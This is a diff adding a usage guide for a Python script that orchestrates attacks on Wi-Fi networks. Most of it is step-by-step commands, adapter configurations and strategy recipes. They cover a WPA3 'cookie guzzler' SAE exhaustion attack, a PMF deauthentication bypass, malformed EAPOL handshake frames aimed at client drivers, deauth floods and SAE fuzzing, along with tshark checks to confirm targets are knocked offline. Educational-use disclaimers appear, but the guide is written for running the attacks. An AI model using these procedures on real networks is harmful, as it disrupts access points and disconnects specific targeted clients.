@@ -1,0 +1,496 @@
+# USAGE GUIDE: orchestator_enhanced_plus_en.py
+
+**DISCLAIMER:** This script is intended for EDUCATIONAL PURPOSES ONLY and for authorized security testing on networks you own or have explicit permission to test. Unauthorized use is illegal.
+
+## OVERVIEW
+This script focuses on advanced client-targeting attacks including PMF exploits, malformed handshake attacks, and the "Cookie Guzzler" AP exhaustion technique. Use this for sophisticated attacks that target both the AP and clients simultaneously.
+
+---
+
+## PREREQUISITES
+
+### Required Hardware
+- Multiple Wi-Fi adapters with monitor mode and injection capability
+- Optional scanner adapter for channel auto-detection
+- Recommended: 3-6 adapters for multi-vector attacks
+
+### Required Software
+- Linux OS (Kali Linux recommended)
+- Python 3.x
+- Scapy: `pip3 install scapy`
+- Aircrack-ng suite: `apt-get install aircrack-ng`
+- Wireshark: `apt-get install wireshark`
+
+---
+
+## STEP-BY-STEP USAGE INSTRUCTIONS
+
+### STEP 1: SET ADAPTERS TO MONITOR MODE
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airmon-ng start wlan1
+sudo airmon-ng start wlan2
+sudo airmon-ng start wlan3
+```
+
+Verify:
+```bash
+iwconfig
+```
+All adapters should show "Mode:Monitor"
+
+---
+
+### STEP 2: SCAN FOR TARGET NETWORK
+
+Identify your target:
+```bash
+sudo airodump-ng wlan0mon --band abg
+```
+
+Record:
+- Target BSSID (5 GHz and 2.4 GHz bands)
+- Channel numbers for both bands
+- **Client MAC addresses** (critical for this script!)
+- ESSID (network name)
+
+Press `Ctrl+C` when done.
+
+---
+
+### STEP 3: EXTRACT SAE PARAMETERS
+
+**Required for WPA3 attacks like cookie_guzzler:**
+
+#### 3.1: Start Wireshark
+```bash
+sudo wireshark
+```
+- Select your monitor interface (e.g., wlan0mon)
+- Start packet capture
+
+#### 3.2: Trigger WPA3 Handshake
+- Use a device (phone/laptop) to connect to target WPA3 network
+- **Use WRONG password** to ensure SAE frames are captured
+- Device will attempt authentication and fail
+
+#### 3.3: Filter for SAE Packets
+Apply display filter:
+```
+wlan.fc.type_subtype == 0x0b
+```
+
+#### 3.4: Extract SAE Parameters
+Locate Authentication frame → Expand packet details:
+```
+IEEE 802.11 wireless LAN
+  └─ Tagged Parameters
+      └─ Tag: SAE
+          ├─ Scalar
+          └─ Finite Field Element
+```
+
+**Extract Scalar:**
+- Right-click "Scalar" → Copy → Value
+- Paste into notepad
+
+**Extract Finite Element:**
+- Right-click "Finite Field Element" → Copy → Value
+- Paste into notepad
+
+---
+
+### STEP 4: CONFIGURE THE SCRIPT
+
+Open the script:
+```bash
+nano orchestator_enhanced_plus_en.py
+```
+
+#### 4.1: Set Target BSSIDs
+```python
+TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"      # 5 GHz band BSSID
+TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"    # 2.4 GHz band BSSID
+```
+
+#### 4.2: Configure Scanner
+```python
+SCANNER_INTERFACE = "wlan0mon"  # Or "" to disable auto-scanning
+```
+
+#### 4.3: Set Manual Channels (if scanner disabled)
+```python
+MANUELLER_KANAL_5GHZ = "36"     # Manual channel for 5 GHz
+MANUELLER_KANAL_2_4GHZ = "1"    # Manual channel for 2.4 GHz
+```
+
+#### 4.4: **CRITICAL: Define Target Clients**
+This script requires specific client MAC addresses for most attacks:
+
+```python
+TARGET_STA_MACS = [
+    "30:34:DB:11:48:09",  # Client 1 MAC address
+    "B2:5D:F9:73:10:6C",  # Client 2 MAC address
+    "6E:8F:9F:B4:3D:10"   # Client 3 MAC address
+]
+```
+
+**How to find client MACs:**
+Use airodump-ng and look at the "Station" section below the AP list. These are connected clients.
+
+#### 4.5: Paste SAE Parameters
+```python
+SAE_SCALAR_HEX = 'YOUR_EXTRACTED_SCALAR_HERE'
+SAE_FINITE_ELEMENT_HEX = 'YOUR_EXTRACTED_FINITE_ELEMENT_HERE'
+```
+
+Replace with values from Wireshark!
+
+#### 4.6: Configure Attack Adapters
+
+**Available attack types:**
+- `deauth_flood`: Classic deauthentication flood
+- `pmf_deauth_exploit`: PMF protection bypass (finishing move)
+- `malformed_msg1_length`: Handshake length manipulation
+- `malformed_msg1_flags`: Handshake flag manipulation
+- `cookie_guzzler`: AP resource exhaustion (WPA3)
+- `bad_algo`: Invalid authentication algorithm
+- `bad_seq`: Invalid SAE sequence number
+- `bad_status_code`: Invalid SAE status code
+- `empty_frame_confirm`: Empty SAE confirm frames
+
+**Example Configuration:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan2mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan3mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan4mon": {"band": "5GHz", "angriff": "pmf_deauth_exploit"},
+    "wlan5mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"}
+}
+```
+
+---
+
+### STEP 5: RUN THE SCRIPT
+
+Execute the attack:
+```bash
+sudo python3 orchestator_enhanced_plus_en.py
+```
+
+**Script workflow:**
+1. Initializes configured adapters
+2. Scans for target channels (if scanner enabled)
+3. Launches attack processes on each adapter
+4. Displays real-time packet counter
+
+**To stop:** Press `Ctrl+C` for graceful shutdown
+
+---
+
+## ATTACK-SPECIFIC DETAILS
+
+### COOKIE_GUZZLER Attack
+**How it works:**
+- Exploits faulty re-transmission behavior in WPA3 APs
+- Sends SAE Commit bursts from random MAC addresses
+- Forces AP to send disproportionate number of responses
+- AP exhausts CPU/memory resources
+
+**Best use:**
+- Primary attack for WPA3 routers
+- Use 2-4 adapters simultaneously
+- Works on both 5 GHz and 2.4 GHz bands
+
+**Configuration example:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan2mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"}
+}
+```
+
+### PMF_DEAUTH_EXPLOIT Attack
+**How it works:**
+- **Phase 1 (Preparation):** Weaken the AP using another DoS attack
+- **Phase 2 (Exploit):** Send unprotected deauth frame
+- Protected client asks overloaded AP for verification (SA Query)
+- AP is too busy to respond → Client disconnects itself
+
+**Critical setup:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"},    # Weakens AP
+    "wlan2mon": {"band": "5GHz", "angriff": "cookie_guzzler"},    # Weakens AP
+    "wlan3mon": {"band": "5GHz", "angriff": "pmf_deauth_exploit"} # Exploit
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]  # Target client
+```
+
+**Best practices:**
+- Use 2-3 adapters for AP overload BEFORE pmf_deauth_exploit
+- Target specific high-value clients
+- Works against PMF-protected (WPA3) clients
+
+### MALFORMED_MSG1 Attacks
+**How it works:**
+- Targets client driver vulnerabilities during 4-Way Handshake
+- Sends manipulated EAPOL Message 1 frames
+- Two variants: length mismatch and flag manipulation
+
+**Configuration:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "malformed_msg1_length"},
+    "wlan2mon": {"band": "5GHz", "angriff": "malformed_msg1_flags"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]  # Required
+```
+
+**Requirements:**
+- Requires target client MAC addresses
+- Client must be attempting to connect/reconnect
+- Combine with deauth_flood to force reconnection attempts
+
+### DEAUTH_FLOOD Attack
+**How it works:**
+- Classic mass deauthentication attack
+- Disconnects clients from AP
+- Works on both WPA2 and WPA3 (without PMF)
+
+**Configuration:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "2.4GHz", "angriff": "deauth_flood"},
+    "wlan2mon": {"band": "5GHz", "angriff": "deauth_flood"}
+}
+TARGET_STA_MACS = [
+    "30:34:DB:11:48:09",
+    "B2:5D:F9:73:10:6C"
+]
+```
+
+---
+
+## VERIFYING ATTACK SUCCESS
+
+### For COOKIE_GUZZLER (AP Overload)
+
+Monitor beacon jitter:
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6E" -T fields -e frame.time_delta_displayed
+```
+
+**Success indicators:**
+- Normal: ~0.1024 seconds between beacons
+- Under attack: 0.5+ seconds (severe overload: 1.0+ seconds)
+
+### For PMF_DEAUTH_EXPLOIT
+
+Monitor client self-disconnection:
+```bash
+sudo tshark -i wlan0mon -Y "wlan.addr == 30:34:DB:11:48:09 && wlan.fc.type_subtype == 0x0c"
+```
+
+**Success indicators:**
+- Deauth frames where SOURCE is the client MAC (client kicked itself)
+- Client disappears from network
+- Client repeatedly fails to reconnect
+
+### For DEAUTH_FLOOD
+
+Monitor deauth frames:
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c && (wlan.addr == 30:34:DB:11:48:09 || wlan.addr == ff:ff:ff:ff:ff:ff)"
+```
+
+**Success indicators:**
+- Continuous stream of deauth packets
+- Clients disappear from airodump-ng station list
+- Network becomes unusable
+
+### For MALFORMED_MSG1 Attacks
+
+Monitor handshake attempts:
+```bash
+sudo tshark -i wlan0mon -Y "wlan.addr == 30:34:DB:11:48:09 && eapol"
+```
+
+**Success indicators:**
+- EAPOL Message 1 sent repeatedly
+- No Message 2/3/4 appears
+- Client repeatedly fails authentication
+
+---
+
+## ATTACK STRATEGY RECOMMENDATIONS
+
+### Strategy 1: Maximum AP Disruption (WPA3)
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan2mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan3mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
+    "wlan5mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"}
+}
+```
+**Effect:** Complete AP overload, all clients disconnected
+
+### Strategy 2: Targeted Client Attack (PMF Bypass)
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan2mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+    "wlan3mon": {"band": "5GHz", "angriff": "pmf_deauth_exploit"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]  # High-value target
+```
+**Effect:** Weaken AP, then exploit PMF vulnerability in specific client
+
+### Strategy 3: Client Driver Exploitation
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "deauth_flood"},
+    "wlan2mon": {"band": "5GHz", "angriff": "malformed_msg1_length"},
+    "wlan3mon": {"band": "5GHz", "angriff": "malformed_msg1_flags"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]
+```
+**Effect:** Force reconnection, then attack handshake process
+
+### Strategy 4: Generic SAE Fuzzing (WPA3)
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "bad_algo"},
+    "wlan2mon": {"band": "5GHz", "angriff": "bad_seq"},
+    "wlan3mon": {"band": "5GHz", "angriff": "bad_status_code"},
+    "wlan4mon": {"band": "5GHz", "angriff": "empty_frame_confirm"}
+}
+```
+**Effect:** Generic protocol confusion, works on various vendors
+
+---
+
+## TROUBLESHOOTING
+
+### "No target client" warnings
+- Ensure TARGET_STA_MACS is populated with valid MACs
+- Verify clients are actually connected (use airodump-ng)
+- Check MAC addresses are correctly formatted (uppercase with colons)
+
+### "Channel switch failed"
+```bash
+# Manually set channel before running script:
+sudo iwconfig wlan1mon channel 36
+```
+
+### PMF_DEAUTH_EXPLOIT not working
+- Ensure AP is overloaded FIRST (check beacon jitter)
+- Verify target client has PMF enabled (WPA3 clients)
+- Increase number of cookie_guzzler adapters (need 2-3 minimum)
+
+### MALFORMED attacks no effect
+- Client driver may be patched
+- Try different client devices
+- Combine with deauth_flood to force reconnection attempts
+
+### Script crashes on start
+- Verify Scapy version: `pip3 show scapy`
+- Update if needed: `pip3 install --upgrade scapy`
+- Check all interfaces exist: `iwconfig`
+- Run with sudo privileges
+
+---
+
+## ADVANCED TIPS
+
+### Combining with Other Scripts
+You can run cookie_guzzler while running attacks from other scripts:
+
+**Terminal 1:**
+```bash
+sudo python3 orchestator_enhanced_plus_en.py  # Cookie guzzler
+```
+
+**Terminal 2:**
+```bash
+sudo python3 orchestator_final_mit_allen_details_en.py  # Amplification
+```
+
+### Timing for PMF_DEAUTH_EXPLOIT
+Monitor beacon jitter in separate terminal. When you see consistent values > 0.5 seconds, PMF exploit will be most effective.
+
+### Client MAC Discovery
+If you don't know client MACs:
+```bash
+sudo airodump-ng wlan0mon --bssid 64:67:72:81:9C:6E -c 36
+```
+Look at "STATION" section for connected client MACs.
+
+---
+
+## STARTING THE SCRIPT
+
+**Standard execution:**
+```bash
+sudo python3 orchestator_enhanced_plus_en.py
+```
+
+**With logging:**
+```bash
+sudo python3 orchestator_enhanced_plus_en.py 2>&1 | tee attack_log.txt
+```
+
+**Background execution:**
+```bash
+sudo screen -S enhanced_attack
+sudo python3 orchestator_enhanced_plus_en.py
+# Detach: Ctrl+A, then D
+# Reattach: sudo screen -r enhanced_attack
+```
+
+---
+
+## IMPORTANT NOTES
+
+1. **Client MACs Required:** Most attacks need TARGET_STA_MACS configured
+2. **SAE Parameters:** cookie_guzzler and SAE attacks need extracted parameters
+3. **PMF Exploit Timing:** AP must be weakened first for PMF bypass to work
+4. **Scanner Recommended:** Auto-detects channels, simplifies setup
+5. **Adapter Compatibility:** Verify all adapters support packet injection
+
+---
+
+## LEGAL DISCLAIMER
+
+**FOR EDUCATIONAL PURPOSES ONLY**
+
+- Only test networks you own or have written authorization to test
+- Unauthorized wireless network attacks are illegal
+- Violators face criminal prosecution and civil liability
+- Use responsibly for security research and authorized penetration testing
+- Author assumes no liability for misuse
+
+**You are solely responsible for your actions.**
+
+---
+
+## REFERENCES
+
+Based on research:
+- "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE" - Journal of Information Security and Applications (2022)
+- "On the Robustness of Wi-Fi Deauthentication Countermeasures" - Research paper on malformed handshake attacks
+
+## SUMMARY
+
+This script specializes in:
+- **Cookie Guzzler:** WPA3 AP exhaustion via burst retransmission exploit
+- **PMF Bypass:** Exploiting overloaded APs to disconnect protected clients
+- **Handshake Attacks:** Malformed EAPOL frames targeting client drivers
+- **Client Targeting:** Focused attacks on specific high-value targets
+
+Use this when you need sophisticated client-level attacks or WPA3-specific AP exhaustion techniques.
